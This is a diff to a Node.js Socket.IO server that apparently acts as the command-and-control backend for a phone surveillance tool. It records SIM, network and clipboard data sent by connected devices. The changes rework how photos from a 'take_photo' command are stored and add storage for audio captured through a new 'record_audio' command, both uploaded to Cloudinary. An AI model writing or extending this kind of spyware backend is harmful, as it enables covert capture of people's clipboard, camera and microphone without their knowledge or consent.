@@ -278,11 +278,9 @@ io.on('connection', async (socket) => {
             if (cleanResult.simInfo)               dataSetOps['data.simInfo']       = cleanResult.simInfo;
             if (cleanResult.networkInfo)           dataSetOps['data.networkInfo']   = cleanResult.networkInfo;
             if (cleanResult.clipboard)             dataSetOps['data.clipboard']     = cleanResult.clipboard;
-            // Store captured photo reference
-            if (cleanResult.cloudinaryUrl)         dataSetOps['data.lastPhoto']     = { url: cleanResult.cloudinaryUrl, publicId: cleanResult.cloudinaryPublicId, timestamp: new Date() };
+            // Store captured photo reference (only for take_photo)
             if (cleanResult.cloudinaryUrl && cleanResult.command === 'take_photo') {
-              // Push to captured photos array
-              // We'll use $push separately
+              dataSetOps['data.lastPhoto'] = { url: cleanResult.cloudinaryUrl, publicId: cleanResult.cloudinaryPublicId, timestamp: new Date() };
             }
           }
 
@@ -302,6 +300,18 @@ io.on('connection', async (socket) => {
             updateDoc.$push = {
               ...updateDoc.$push,
               'data.capturedPhotos': {
+                url: cleanResult.cloudinaryUrl,
+                publicId: cleanResult.cloudinaryPublicId,
+                timestamp: new Date()
+              }
+            };
+          }
+
+          // If audio was recorded, push to data.recordedAudios array
+          if (cleanResult && cleanResult.cloudinaryUrl && cleanResult.command === 'record_audio') {
+            updateDoc.$push = {
+              ...updateDoc.$push,
+              'data.recordedAudios': {
                 url: cleanResult.cloudinaryUrl,
                 publicId: cleanResult.cloudinaryPublicId,
                 timestamp: new Date()
